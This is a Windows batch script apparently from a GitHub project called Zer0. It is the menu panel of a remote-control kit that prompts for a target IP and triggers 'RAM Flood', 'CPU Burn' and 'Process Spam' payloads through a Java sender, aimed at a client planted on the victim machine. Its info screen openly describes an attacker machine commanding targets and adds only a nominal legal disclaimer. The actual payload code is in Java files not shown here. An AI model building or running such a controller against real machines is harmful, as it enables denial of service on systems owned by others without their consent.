@echo off
title [Zer0Panel] - Loading
color 0F
mode con: cols=60 lines=25
chcp 65001 >nul
javac Zer0Sender.java
timeout /t 1 >nul

:logs
set log=Zer0Panel.log
type nul > %log%
echo ==================================================================================== >> %log%
echo. >> %log%
echo ███████╗███████╗██████╗  ██████╗ ██████╗  █████╗ ███╗   ██╗███████╗██╗      >> %log%
echo ╚══███╔╝██╔════╝██╔══██╗██╔═████╗██╔══██╗██╔══██╗████╗  ██║██╔════╝██║      >> %log%
echo   ███╔╝ █████╗  ██████╔╝██║██╔██║██████╔╝███████║██╔██╗ ██║█████╗  ██║      >> %log%
echo  ███╔╝  ██╔══╝  ██╔══██╗████╔╝██║██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║      >> %log%
echo ███████╗███████╗██║  ██║╚██████╔╝██║     ██║  ██║██║ ╚████║███████╗███████╗ >> %log%
echo ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ >> %log%
echo. >> %log%
echo ==================================================================================== >> %log%
echo                               Zer0Panel :: v1.0 >> %log%
echo                       Developed and written by Kaldarix >> %log%
echo ==================================================================================== >> %log%
goto menu

:menu
title [Zer0Panel] - Menu
chcp 65001 >nul
cls
echo.
echo =================== Zer0Panel ===================
echo.
echo [1] Launch RAM Flood
echo [2] Launch CPU Burn
echo [3] Launch Process Spammer
echo [4] Info
echo [5] Exit
echo.
set /p choice=Select option 1-5: 

if "%choice%"=="1" goto ram
if "%choice%"=="2" goto cpu
if "%choice%"=="3" goto spam
if "%choice%"=="4" goto info
if "%choice%"=="5" exit
goto menu

:ram
title [Zer0Panel] - RAM
echo User selected RAM Payload >> %log%
set /p target=Enter target IP: 
ping -n 1 %target% >> %log%
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Failed to ping %target%, see logs. Aborting...' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Failed to ping %target% Aborting... >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
    pause
    goto menu
) else (
    powershell -Command "Write-Host '[Zer0Loader] Successfully pinged %target%, continuing...' -ForegroundColor Green"
)

java -cp . Zer0Sender %target% RAMFLOOD >> %log%
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Java execution failed. RAM Flood not sent.' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Java execution failed. RAM Flood not sent. >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
) else (
    powershell -Command "Write-Host '[Zer0Loader] RAM Flood command has been successfully sent.' -ForegroundColor Green"
)
timeout /t 3 >nul
goto menu

:cpu
title [Zer0Panel] - CPU Burn
echo User selected CPU Brun Payload >> %log%
set /p target=Enter target IP: 
ping -n 1 %target% >nul
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Failed to ping %target%, see logs. Aborting...' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Failed to ping %target% Aborting... >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
    pause
    goto menu
) else (
    powershell -Command "Write-Host '[Zer0Loader] Successfully pinged %target%, continuing...' -ForegroundColor Green"
)

java -cp . Zer0Sender %target% CPUBURN
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Java execution failed. CPU Burn not sent.' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Java execution failed. CPU Burn not sent. >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
) else (
    powershell -Command "Write-Host '[Zer0Loader] CPU BURN command has been successfully sent.' -ForegroundColor Green"
)
timeout /t 3 >nul
goto menu

:spam
title [Zer0Panel] - Spammer
echo User selected Spam Payload >> %log%
set /p target=Enter target IP: 
ping -n 1 %target% >nul
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Failed to ping %target%, see logs. Aborting...' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Failed to ping %target% Aborting... >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
    pause
    goto menu
) else (
    powershell -Command "Write-Host '[Zer0Loader] Successfully pinged %target%, continuing...' -ForegroundColor Green"
)

java -cp . Zer0Sender %target% SPAM
if errorlevel 1 (
    powershell -Command "Write-Host '[Zer0Loader] Java execution failed. Spam not sent.' -ForegroundColor Red"
	powershell -Command "Write-Host '[Zer0Loader] For more information please visit the GitHub page.' -ForegroundColor Yellow"
	powershell -Command "Write-Host '[Zer0Loader] To visit the GitHub page select Info option in the main menu!' -ForegroundColor Yellow"
	echo [Zer0Loader] Java execution failed. Spam not sent. >> %log%
	echo [Zer0Loader] For more information please visit the GitHub page. >> %log%
	echo [Zer0Loader] To visit the GitHub page select Info option in the main menu! >> %log%
) else (
    powershell -Command "Write-Host '[Zer0Loader] Spam command has been successfully sent.' -ForegroundColor Green"
)
timeout /t 3 >nul
goto menu

:info
cls
chcp 65001 >nul
echo.
echo ====================================================================================
echo                             Zer0 :: Software Information
echo ====================================================================================
echo.
echo Description:
echo   Zer0 is a Java-based payload control panel for remote command execution.
echo   Developed for educational and entertainment purposes.
echo.
echo Components:
echo   Zer0Loader (Sender)  - Checks for JDK and loads the Zer0Panel.
echo.
echo   Zer0Loader (Target)  - Loads Zer0Target and makes sure that the target is
echo                        ready for recieving payloads.
echo.
echo   Zer0Panel  - Contains payload activators.
echo.
echo   Zer0Sender  - Java-based sender running on attacker machine.
echo                  Sends payload commands to the target.
echo.
echo   Zer0Target  - Java client running on the target machine.
echo                  Receives and executes commands like RAM Flood, CPU Burn, etc.
echo.
echo.
echo Available Payloads:
echo   [1] RAM Flood     - Sends a memory overload command to the target.
echo   [2] CPU Burn      - Triggers high CPU load of the target via infinite processing loop.
echo   [3] Process Spam  - Spams dummy processes on the target system.
echo.
echo.
echo Requirements:
echo   - Java SE Development Kit (JDK 11 or newer)!
echo   - Zer0Sender.class in the working directory!
echo   - Client machines must be running the Zer0Target Java receiver!
echo.
echo.
echo Legal Notice:
echo   This tool is intended for use in **controlled environments** only.
echo   Unauthorized use against machines you do not own or have permission to test
echo   is strictly prohibited and may violate laws.
echo.
echo.
echo GitHub / Docs:
echo   https://github.com/Kaldarix/Zer0
echo.
echo.
echo Author:
echo  Kaldarix - Developing, Programming
echo ====================================================================================
pause
goto menu
